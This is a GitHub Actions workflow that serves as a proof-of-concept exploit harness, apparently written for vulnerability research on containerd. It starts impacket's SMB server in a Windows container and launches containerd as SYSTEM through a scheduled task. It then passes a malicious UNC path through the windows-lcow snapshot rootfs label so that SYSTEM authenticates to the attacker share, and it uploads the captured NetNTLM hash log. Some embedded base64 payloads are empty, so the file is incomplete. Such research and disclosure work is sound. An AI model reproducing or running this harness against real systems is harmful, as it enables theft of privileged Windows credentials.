name: D17 LCOW UNC NetNTLM via Windows container SMB
on:
  workflow_dispatch:

jobs:
  winsmb:
    runs-on: windows-latest
    timeout-minutes: 35
    steps:
      - name: Setup containerd + harness + stub
        shell: pwsh
        run: |
          $ErrorActionPreference='Stop'
          $base='C:\ctdpoc'
          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
          $cfg=''; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
          $mn=''; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
          $st=''; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
          $env:GO111MODULE='on'
          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
          Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py' -OutFile "$base\smbserver.py" -UseBasicParsing
          Write-Output "SETUP_OK"

      - name: Pull Python Windows container + start SMB server
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          Write-Output '=== pulling image (may take minutes) ==='
          docker pull python:3.12-windowsservercore-ltsc2022 2>&1 | Select-Object -Last 8
          Write-Output "PULL_EXIT=$LASTEXITCODE"
          docker images python:3.12-windowsservercore-ltsc2022 2>&1
          $cmd = 'python -m pip install --quiet impacket && python C:\ctdpoc\smbserver.py -smb2support -disablekerberos -debug -ip 0.0.0.0 -outputfile C:\ctdpoc\smb.log SHARE C:\ctdpoc\share'
          $d = docker run -d --name smb -v 'C:\ctdpoc:C:\ctdpoc' python:3.12-windowsservercore-ltsc2022 cmd /c $cmd 2>&1
          Write-Output "DOCKER_RUN=$d"
          Start-Sleep -Seconds 40
          Write-Output '=== container ps ==='
          docker ps -a 2>&1
          Write-Output '=== container logs ==='
          docker logs smb 2>&1 | Select-Object -Last 25
          $cip = docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smb 2>&1
          Write-Output "CONTAINER_IP=$cip"

      - name: Start containerd(SYSTEM) + trigger UNC + capture
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ctdpoc'
          $cip = docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smb 2>&1
          Write-Output "CONTAINER_IP=$cip"
          $unc = "\\$cip\SHARE"
          Write-Output "UNC=$unc"
          # start containerd as SYSTEM
          $act=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
          $prin=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
          $task=New-ScheduledTask -Action $act -Principal $prin
          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
          Start-Sleep -Seconds 10
          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
          Write-Output "=== malicious UNC label: $unc ==="
          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-winsmb' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_winsmb.out"
          Write-Output "POC_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 5
          Write-Output '=== captured SMB hash log ==='
          if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 } else { Write-Output 'NO SMB LOG' }
          Write-Output '=== container logs tail ==='
          docker logs smb 2>&1 | Select-Object -Last 40

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ctd-winsmb-evidence
          path: |
            C:\ctdpoc\smb.log
            C:\ctdpoc\prepare_winsmb.out
            C:\ctdpoc\stderr.log
            C:\ctdpoc\stdout.log
          if-no-files-found: warn
